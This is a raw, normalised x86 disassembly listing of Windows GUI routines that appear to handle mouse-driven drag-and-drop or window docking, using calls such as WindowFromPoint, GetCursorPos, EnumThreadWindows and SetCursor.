pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edx + 0x8 ]
mov [ ebp - 0x10 ] eax
movsx eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
movsx eax [ ebp - 0xe ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_439cb0
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ edx + 0xc ] 0x1
xor eax eax
call sub_43a340
jmp r-xdata
mov eax [ rw-data ]
add eax 0x10
call sub_439cb0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_43a340
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
jmp r-xdata
mov al 0x1
call sub_43a340
jmp r-xdata
xor eax eax
call sub_43a340
jmp r-xdata
sub_4392d8
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4589e0
call sub_404854
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_43a340
sub_439330
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43935a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4393c0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_439138
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x40 ]
mov [ ebx + 0x40 ] eax
sub_4393ec
push ebp
mov ebp esp
push esi
push edi
mov esi eax
mov edi [ esi + 0x40 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov eax edi
mov si 0xffdd
call sub_404160
sub_439410
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x40 ]
mov si 0xffdf
call sub_404160
xor edx edx
sub_439468
push ebx
mov ebx eax
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_4459f4
sub_439488
push ebx
mov ebx eax
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_4459dc
sub_4394ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43939c
mov [ ebx + 0x38 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_423d20
mov esi eax
mov [ ebx + 0x48 ] esi
mov edx 0xffffff
xor eax eax
call sub_42a790
mov edx eax
mov eax esi
call sub_423e9c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_439514
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x48 ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_439544
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4393c0
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
movzx edx [ eax + 0x5c ]
mov [ ebx + 0x5c ] dl
mov edx [ eax + 0x60 ]
mov [ ebx + 0x60 ] edx
movzx edx [ eax + 0x74 ]
mov [ ebx + 0x74 ] dl
push esi
lea esi [ eax + 0x4c ]
lea edi [ ebx + 0x4c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x64 ]
lea edi [ ebx + 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x48 ]
mov eax [ ebx + 0x48 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_4395c0
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_4395e4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4395c0
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4395c0
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x4c ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4396a4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_439710
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_439b58
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_438b98
mov esi eax
test esi esi
je r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_443be8
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_443be8
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_443be8
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbc
call sub_404160
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_4396a4
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_443be8
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x94 ]
call sub_443be8
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_4398ac
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_443be8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_443be8
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_4398f0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xbc ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_4390d4
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_439710
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4167c8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_443be8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_4398ac
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbb
call sub_404160
test al al
je r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbc
call sub_404160
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_43901c
sub_439a44
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_416824
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_4166b4
mov edx esi
mov eax [ rw-data ]
call sub_416668
jmp r-xdata
sub_439aa0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_439af8
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_405324
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_438b64
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_439b58
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_439af8
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_439b84
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_4398f0
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_439b58
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_439aa0
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_443be8
mov [ esi ] eax
sub_439bd4
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0x10
push eax
mov eax [ rw-data ]
mov eax [ eax + 0xc ]
mov ecx [ rw-data ]
mov edx ebx
call sub_439aa0
cmp eax 0x1
sbb eax eax
inc eax
sub_439c10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ esi + 0x1db ] 0x0
je r-xdata
cmp [ esi + 0x1ac ] 0x0
je r-xdata
mov eax esi
call sub_44259c
test eax eax
je r-xdata
mov eax esi
call sub_44259c
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0x10
xor edx edx
call sub_43a6b0
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x1ac ]
call sub_4167c8
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x1ac ]
call sub_416824
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx edi
mov eax esi
call sub_4425b0
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_439cb0
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
movzx ecx [ eax + 0x8f ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_439b84
mov esi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ ebx ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8f ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ ebx + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44589c
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ ebx ]
mov [ eax + 0x10 ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x14 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov al 0x1
call sub_439bd4
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp esi [ eax + 0x8 ]
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov al 0x2
call sub_439bd4
mov edx eax
mov ecx [ ebx ]
mov eax [ rw-data ]
mov edi [ eax ]
call [ edi + 0x4 ]
mov edi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
call sub_43bc78
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x18 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x1c ] edx
mov eax [ rw-data ]
mov [ eax + 0x8 ] esi
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0xc ] edx
mov eax [ rw-data ]
mov edx [ ebx ]
mov [ eax + 0x10 ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x14 ] edx
xor eax eax
call sub_439bd4
cmp [ rw-data ] 0x0
je r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456450
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_445878
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ esi + 0x51 ] 0x20
jne r-xdata
call sub_439c10
mov edi eax
mov eax [ rw-data ]
mov [ eax + 0x60 ] edi
test edi edi
jne r-xdata
mov edx [ ebx + 0x4 ]
push edx
mov ecx [ ebx ]
mov eax [ rw-data ]
mov edx [ eax + 0x40 ]
xchg edx eax
mov si 0xffe7
call sub_404160
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax [ rw-data ]
call sub_445998
jmp r-xdata
mov eax [ ebx + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ ebx ]
mov eax [ rw-data ]
call sub_44589c
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax edi
call sub_43bc78
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffd8
call sub_404160
mov edx [ rw-data ]
mov [ edx + 0x5c ] al
mov eax [ rw-data ]
lea edx [ eax + 0x18 ]
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov si 0xffd8
call sub_404160
mov edx [ rw-data ]
mov [ edx + 0x5c ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_445a0c
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456450
push eax
call SetCursor
mov ebx [ rw-data ]
lea edx [ ebx + 0x64 ]
lea eax [ ebx + 0x4c ]
mov ecx 0x10
call sub_4091b0
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x4c ]
lea edi [ eax + 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_439f98
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x8 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
mov edx [ rw-data ]
mov [ eax + 0x14 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_439178
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x4c ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x28 ] ecx
mov [ edx + 0x2c ] ecx
mov edi [ edx + 0x10 ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x28 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44589c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov ecx esi
mov edi [ ecx + 0x14 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x30 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_439cb0
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_43a108
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_43a2ad
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x8f ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_404160
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_404160
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x40 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4394ac
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_439f98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43939c
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x40 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x4c
push eax
mov eax esi
call sub_443be8
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_415348
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_43bbc8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x4c ]
lea edi [ eax + 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x50 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x50 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x40 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x4c ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_415348
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x54 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x58 ] edx
sub_43a2cc
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x94 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x94 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
mov si 0xffbd
call sub_404160
mov ebx eax
sub_43a340
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x9 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x5 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_43a655
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_43a5e3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x5 ] 0x1
mov eax [ rw-data ]
movzx edx [ ebp - 0x1 ]
